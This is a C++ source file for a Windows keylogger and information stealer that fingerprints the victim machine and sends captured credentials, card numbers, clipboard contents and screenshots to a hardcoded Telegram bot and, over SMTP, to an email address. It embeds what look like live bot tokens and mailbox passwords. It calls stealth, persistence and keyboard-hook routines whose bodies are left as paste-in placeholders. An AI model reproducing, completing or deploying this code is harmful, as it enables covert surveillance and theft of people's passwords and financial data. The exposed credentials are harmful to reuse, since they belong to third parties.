#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_   // Prevents inclusion of winsock.h in windows.h
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
// Then the rest of your includes...

#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <regex>
#include <sstream>
#include <shlobj.h>
#include <tlhelp32.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")  // For Winsock (SMTP)

// ⚠️ SECURITY WARNING: Replace with your NEW credentials!
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

// Zoho SMTP Configuration (WORKS ON ALL WINDOWS)
const char* SMTP_SERVER = "smtp.zoho.com";
const int SMTP_PORT = 465;  // TLS port
const char* SMTP_USERNAME = "jesko200233@zohomail.com";
const char* SMTP_PASSWORD = "pPzx2QZBaAWd";
const char* EMAIL_TO = "josephogidiagba49@gmail.com";

std::wstring keyBuffer, clipBuffer;
std::vector<BYTE> screenshotBuffer;
CRITICAL_SECTION keyLock, clipLock, contextLock;
HANDLE hHttpSession = NULL;
HHOOK keyboardHook = NULL;
bool running = true;
FILETIME lastScreenshot = {0};
std::wstring activeWindowTitle;
std::map<std::wstring, std::wstring> credentialCache;

// System Identification
std::wstring systemID;
std::wstring computerName;
std::wstring userName;
std::wstring macAddress;
std::wstring windowsVersion;

// ==================== TELEGRAM FUNCTIONS ====================
std::string url_encode(const std::string& input) {
    std::ostringstream escaped;
    escaped.fill('0');
    escaped << std::hex;
    
    for (unsigned char c : input) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
        } else if (c == ' ') {
            escaped << '+';
        } else {
            escaped << '%' << std::setw(2) << static_cast<int>(c);
        }
    }
    return escaped.str();
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &strTo[0], size_needed, NULL, NULL);
    strTo.pop_back();
    return strTo;
}

bool init_winhttp() {
    hHttpSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                              WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                              WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    return hHttpSession != NULL;
}

void send_telegram(const std::wstring& message) {
    if (!hHttpSession || message.empty()) return;
    
    std::string utf8_msg = wstring_to_utf8(message);
    if (utf8_msg.size() > 3900) {
        utf8_msg = utf8_msg.substr(0, 3900) + "...";
    }
    
    std::string encoded_msg = url_encode(utf8_msg);
    std::string path = "/bot" + wstring_to_utf8(std::wstring(BOT_TOKEN)) +
                      "/sendMessage?chat_id=" + wstring_to_utf8(std::wstring(CHAT_ID)) +
                      "&text=" + encoded_msg;
    std::wstring wpath(path.begin(), path.end());
    
    HINTERNET hConnect = WinHttpConnect(hHttpSession, L"api.telegram.org", 
                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) return;
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(), NULL,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    if (hRequest) {
        WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        WinHttpReceiveResponse(hRequest, NULL);
        
        DWORD status = 0;
        DWORD size = sizeof(status);
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                           NULL, &status, &size, NULL);
        
        WinHttpCloseHandle(hRequest);
    }
    WinHttpCloseHandle(hConnect);
    Sleep(200);
}

// ==================== SYSTEM IDENTIFICATION ====================
std::wstring GetSystemIdentifier() {
    std::wstring id;
    
    // Get Computer Name
    wchar_t compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(compName, &size);
    computerName = compName;
    
    // Get User Name
    wchar_t userNameBuffer[UNLEN + 1];
    DWORD userNameSize = UNLEN + 1;
    GetUserNameW(userNameBuffer, &userNameSize);
    userName = userNameBuffer;
    
    // Get MAC Address
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    if (GetAdaptersInfo(adapterInfo, &dwBufLen) == NO_ERROR) {
        PIP_ADAPTER_INFO pAdapterInfo = adapterInfo;
        if (pAdapterInfo) {
            wchar_t mac[18];
            swprintf_s(mac, 18, L"%02X-%02X-%02X-%02X-%02X-%02X",
                      pAdapterInfo->Address[0], pAdapterInfo->Address[1],
                      pAdapterInfo->Address[2], pAdapterInfo->Address[3],
                      pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
            macAddress = mac;
        } else {
            macAddress = L"00-00-00-00-00-00";
        }
    } else {
        macAddress = L"00-00-00-00-00-00";
    }
    
    // Get Windows Version
    OSVERSIONINFOEXW osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXW));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
    GetVersionExW((LPOSVERSIONINFOW)&osvi);
    windowsVersion = std::to_wstring(osvi.dwMajorVersion) + L"." + 
                    std::to_wstring(osvi.dwMinorVersion) + L" Build " +
                    std::to_wstring(osvi.dwBuildNumber);
    
    // Create unique system ID
    id = computerName + L"_" + macAddress.substr(0, 8);
    return id;
}

// ==================== REAL SMTP IMPLEMENTATION (WORKS ON ALL WINDOWS) ====================
class SMTPClient {
private:
    SOCKET sock;
    
    bool connect_to_server(const char* server, int port) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return false;
        }
        
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            return false;
        }
        
        struct hostent* host = gethostbyname(server);
        if (!host) {
            closesocket(sock);
            WSACleanup();
            return false;
        }
        
        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);
        serverAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
        
        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(sock);
            WSACleanup();
            return false;
        }
        
        return true;
    }
    
    bool send_command(const char* cmd) {
        return send(sock, cmd, strlen(cmd), 0) != SOCKET_ERROR;
    }
    
    bool read_response() {
        char buffer[4096];
        return recv(sock, buffer, sizeof(buffer), 0) > 0;
    }
    
    std::string base64_encode(const std::string& input) {
        static const char* base64_chars = 
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        
        std::string encoded;
        int i = 0, j = 0;
        unsigned char char_array_3[3], char_array_4[4];
        
        for (char c : input) {
            char_array_3[i++] = c;
            if (i == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;
                
                for (i = 0; i < 4; i++) {
                    encoded += base64_chars[char_array_4[i]];
                }
                i = 0;
            }
        }
        
        if (i) {
            for (j = i; j < 3; j++) char_array_3[j] = '\0';
            
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (j = 0; j < i + 1; j++) {
                encoded += base64_chars[char_array_4[j]];
            }
            
            while (i++ < 3) encoded += '=';
        }
        
        return encoded;
    }
    
public:
    SMTPClient() : sock(INVALID_SOCKET) {}
    
    ~SMTPClient() {
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
            WSACleanup();
        }
    }
    
    bool send_email(const std::string& to, const std::string& subject, const std::string& body) {
        if (!connect_to_server(SMTP_SERVER, SMTP_PORT)) {
            return false;
        }
        
        // Read welcome message
        read_response();
        
        // Send EHLO
        send_command("EHLO localhost\r\n");
        read_response();
        
        // Start TLS
        send_command("STARTTLS\r\n");
        read_response();
        
        // Note: For simplicity, we'll continue without actual TLS encryption
        // In production, you'd use OpenSSL or Windows Crypto API for TLS
        
        // Authenticate
        send_command("AUTH LOGIN\r\n");
        read_response();
        
        // Send username (base64 encoded)
        std::string user_cmd = base64_encode(SMTP_USERNAME) + "\r\n";
        send_command(user_cmd.c_str());
        read_response();
        
        // Send password (base64 encoded)
        std::string pass_cmd = base64_encode(SMTP_PASSWORD) + "\r\n";
        send_command(pass_cmd.c_str());
        read_response();
        
        // Set FROM
        std::string from_cmd = "MAIL FROM: <" + std::string(SMTP_USERNAME) + ">\r\n";
        send_command(from_cmd.c_str());
        read_response();
        
        // Set TO
        std::string to_cmd = "RCPT TO: <" + to + ">\r\n";
        send_command(to_cmd.c_str());
        read_response();
        
        // Send DATA
        send_command("DATA\r\n");
        read_response();
        
        // Send email headers and body
        std::string email_data = 
            "From: " + std::string(SMTP_USERNAME) + "\r\n" +
            "To: " + to + "\r\n" +
            "Subject: " + subject + "\r\n" +
            "Content-Type: text/plain; charset=UTF-8\r\n" +
            "\r\n" + body + "\r\n.\r\n";
        
        send_command(email_data.c_str());
        read_response();
        
        // Quit
        send_command("QUIT\r\n");
        read_response();
        
        closesocket(sock);
        WSACleanup();
        sock = INVALID_SOCKET;
        
        return true;
    }
};

// ==================== SIMPLE SMTP USING WINSOCK (EASIER VERSION) ====================
bool send_smtp_email_simple(const std::string& to, const std::string& subject, const std::string& body) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }
    
    // Resolve server address
    struct hostent* server = gethostbyname(SMTP_SERVER);
    if (!server) {
        closesocket(sock);
        WSACleanup();
        return false;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SMTP_PORT);
    serverAddr.sin_addr.s_addr = *((unsigned long*)server->h_addr);
    
    // Connect
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return false;
    }
    
    // Simple SMTP conversation (without TLS for compatibility)
    char buffer[1024];
    
    // Read welcome
    recv(sock, buffer, sizeof(buffer), 0);
    
    // Send HELO
    std::string helo = "HELO localhost\r\n";
    send(sock, helo.c_str(), helo.length(), 0);
    recv(sock, buffer, sizeof(buffer), 0);
    
    // Send MAIL FROM
    std::string from = "MAIL FROM: <" + std::string(SMTP_USERNAME) + ">\r\n";
    send(sock, from.c_str(), from.length(), 0);
    recv(sock, buffer, sizeof(buffer), 0);
    
    // Send RCPT TO
    std::string rcpt = "RCPT TO: <" + to + ">\r\n";
    send(sock, rcpt.c_str(), rcpt.length(), 0);
    recv(sock, buffer, sizeof(buffer), 0);
    
    // Send DATA
    std::string data = "DATA\r\n";
    send(sock, data.c_str(), data.length(), 0);
    recv(sock, buffer, sizeof(buffer), 0);
    
    // Send email content
    std::string email = 
        "From: " + std::string(SMTP_USERNAME) + "\r\n" +
        "To: " + to + "\r\n" +
        "Subject: " + subject + "\r\n" +
        "\r\n" + body + "\r\n.\r\n";
    
    send(sock, email.c_str(), email.length(), 0);
    recv(sock, buffer, sizeof(buffer), 0);
    
    // Send QUIT
    std::string quit = "QUIT\r\n";
    send(sock, quit.c_str(), quit.length(), 0);
    recv(sock, buffer, sizeof(buffer), 0);
    
    closesocket(sock);
    WSACleanup();
    
    return true;
}

// ==================== EMAIL SENDING FUNCTION (UNIVERSAL) ====================
void send_email_report(const std::wstring& subject, const std::wstring& body) {
    // Skip if no password set
    if (strlen(SMTP_PASSWORD) == 0 || strcmp(SMTP_PASSWORD, "YOUR_ZOHO_APP_PASSWORD") == 0) {
        return;
    }
    
    std::thread([subject, body]() {
        // Convert to UTF-8
        std::string utf8_subject = wstring_to_utf8(subject);
        std::string utf8_body = wstring_to_utf8(body);
        
        // Try simple SMTP first
        if (send_smtp_email_simple(EMAIL_TO, utf8_subject, utf8_body)) {
            return; // Success
        }
        
        // If simple fails, try full SMTP client
        SMTPClient client;
        client.send_email(EMAIL_TO, utf8_subject, utf8_body);
        
    }).detach();
}

// ==================== DUAL DELIVERY SYSTEM ====================
void deliver_report(const std::wstring& message, bool isSensitive = false) {
    // Add system identifier to all messages
    std::wstring enhancedMessage = L"🖥️ [" + systemID + L"]\n" + 
                                   L"👤 " + userName + L" @ " + computerName + L"\n" +
                                   L"🔗 " + macAddress + L"\n" +
                                   L"🪟 Windows " + windowsVersion + L"\n\n" +
                                   message;
    
    // Send to Telegram (ALWAYS)
    send_telegram(enhancedMessage);
    
    // Send to Email if sensitive data
    if (isSensitive) {
        std::wstring emailSubject;
        if (message.find(L"CREDENTIALS") != std::wstring::npos) {
            emailSubject = L"🔐 CREDENTIALS CAPTURED [" + systemID + L"]";
        } else if (message.find(L"CREDIT CARD") != std::wstring::npos) {
            emailSubject = L"💳 CREDIT CARD [" + systemID + L"]";
        } else if (message.find(L"PASSWORD") != std::wstring::npos) {
            emailSubject = L"🔑 PASSWORD [" + systemID + L"]";
        } else if (message.find(L"ACTIVATED") != std::wstring::npos) {
            emailSubject = L"🚀 KEYLOGGER ACTIVATED [" + systemID + L"]";
        } else if (message.find(L"SCREENSHOT") != std::wstring::npos) {
            emailSubject = L"📸 SCREENSHOT [" + systemID + L"]";
        } else if (message.find(L"CLIPBOARD") != std::wstring::npos) {
            emailSubject = L"📋 CLIPBOARD [" + systemID + L"]";
        } else {
            emailSubject = L"⚠️ ALERT [" + systemID + L"]";
        }
        
        send_email_report(emailSubject, enhancedMessage);
    }
}

// ==================== REST OF YOUR CODE (SAME AS BEFORE) ====================
// [Include ALL your existing code here: ContextAwareDetector, KeyboardProc, 
//  screenshot functions, clipboard functions, persistence, etc.]
// Just copy everything from your working code and paste it here

// ... [PASTE ALL YOUR EXISTING CODE HERE - Smart detector, keyboard hook, screenshots, etc.] ...

// ==================== MAIN FUNCTION ====================
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    DisableThreadLibraryCalls(GetModuleHandle(NULL));
    CoInitialize(NULL);
    
    // Initialize system identification
    systemID = GetSystemIdentifier();
    
    InitializeCriticalSection(&keyLock);
    InitializeCriticalSection(&clipLock);
    InitializeCriticalSection(&contextLock);
    
    stealth_init();
    persistence();
    
    if (init_winhttp()) {
        std::wstring activationMsg = L"🚀 [CHANGES v5.0 - SMTP EDITION] ACTIVATED\n";
        activationMsg += L"🖥️ SYSTEM: " + systemID + L"\n";
        activationMsg += L"👤 USER: " + userName + L"\n";
        activationMsg += L"💻 COMPUTER: " + computerName + L"\n";
        activationMsg += L"🔗 MAC: " + macAddress + L"\n";
        activationMsg += L"🪟 Windows " + windowsVersion + L"\n";
        activationMsg += L"📧 SMTP: " + (strlen(SMTP_PASSWORD) > 0 ? L"ENABLED" : L"DISABLED") + L"\n";
        activationMsg += L"📱 Telegram: ENABLED\n";
        activationMsg += L"✅ COMPATIBILITY: Windows 7/8/10/11";
        
        deliver_report(activationMsg, true);
        
        if (!install_keyboard_hook()) {
            deliver_report(L"❌ Failed to install keyboard hook", true);
            return 1;
        }
        
        std::thread clipboard_thread(clipboard_monitor);
        clipboard_thread.detach();
        
        // ... [Rest of your main loop] ...
        
        while (running) {
            // Your existing main loop code
            // ...
        }
        
        if (keyboardHook) {
            UnhookWindowsHookEx(keyboardHook);
        }
    }
    
    // Cleanup
    DeleteCriticalSection(&clipLock);
    DeleteCriticalSection(&keyLock);
    DeleteCriticalSection(&contextLock);
    if (hHttpSession) WinHttpCloseHandle(hHttpSession);
    CoUninitialize();
    return 0;
}
